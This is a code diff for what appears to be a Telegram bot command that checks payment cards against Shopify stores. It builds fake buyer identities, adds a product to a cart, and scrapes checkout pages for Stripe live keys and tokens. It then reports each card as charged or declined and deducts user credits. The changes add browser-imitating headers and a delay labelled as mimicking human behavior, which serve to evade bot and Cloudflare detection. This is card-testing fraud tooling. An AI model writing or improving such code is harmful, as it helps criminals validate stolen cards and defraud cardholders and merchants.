@@ -4,7 +4,6 @@ import time
 import re
 import json
 import random
-import string
 from html import escape
 from urllib.parse import urlparse
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -84,15 +83,27 @@ def gen_fake_data():
     email = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@gmail.com"
     return fn, ln, street, city, state, zip_code, phone, email
 
+def get_full_chrome_headers():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Cache-Control': 'max-age=0',
+    }
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # REAL SHOPIFY API AUTOMATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def check_shopify_direct(session, site_url, price, card_data, proxy):
+async def check_shopify_real(session, site_url, price, card_data, proxy):
     base_url = site_url.rstrip('/')
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
-    }
+    headers = get_full_chrome_headers()
 
     # 1. Fetch Product
     async with session.get(f"{base_url}/products.json?limit=1", headers=headers, proxy=proxy, timeout=15) as resp:
@@ -106,8 +117,10 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
     async with session.post(f"{base_url}/cart/add.js", headers={**headers, 'Content-Type': 'application/json'}, json=cart_payload, proxy=proxy, timeout=15) as resp:
         if resp.status != 200: return "DECLINED", "CART_ADD_FAILED"
 
-    # 3. Scrape Checkout Page for Tokens
-    # We use allow_redirects=True to follow the chain to checkout.shopify.com
+    # Wait 1 second to mimic human behavior
+    await asyncio.sleep(1)
+
+    # 3. Scrape Checkout Page for Tokens (Follows redirects to checkout.shopify.com)
     async with session.get(f"{base_url}/checkout", headers=headers, proxy=proxy, timeout=25, allow_redirects=True) as resp:
         html = await resp.text()
         
@@ -115,16 +128,16 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
         if "Just a moment" in html or "Checking your browser" in html or "cf-challenge" in html:
             return "DECLINED", "CLOUDFLARE_BLOCK"
             
-        # Search for Stripe Publishable Key
+        # Search for Stripe Publishable Key (pk_live_...)
         match_pk = re.search(r'pk_live_[A-Za-z0-9]+', html)
         # Search for Checkout Token
         match_token = re.search(r'checkout_token["\']?\s*[:=]\s*["\']?([a-f0-9]+)', html)
         # Search for Authenticity Token
         match_auth = re.search(r'name=["\']authenticity_token["\']\s*value=["\']([^"\']+)', html)
         
-        # If we can't find the tokens, the checkout is unavailable or locked
+        # If we can't find the tokens, the checkout is locked or JS protected
         if not match_pk or not match_token:
-            return "DECLINED", "CHECKOUT_UNAVAILABLE"
+            return "DECLINED", "CHECKOUT_JS_BLOCKED"
             
         stripe_pk = match_pk.group(0)
         checkout_token = match_token.group(1)
@@ -226,7 +239,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         ud["credits"] -= 1
 
-    msg = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Pʀᴏᴄᴇꜱꜱɪɴɢ...</b>", parse_mode="HTML")
+    msg = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>", parse_mode="HTML")
     start_time = time.time()
     bin_num = card_str[:6]
 
@@ -239,7 +252,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         site_domain = urlparse(site_url).netloc
         
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            status, raw_response = await check_shopify_direct(session, site_url, price, card_data, proxy)
+            status, raw_response = await check_shopify_real(session, site_url, price, card_data, proxy)
             
         status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"
 
@@ -293,3 +306,4 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def get_sh_handler():
     return CommandHandler("sh", cmd_sh)
+    
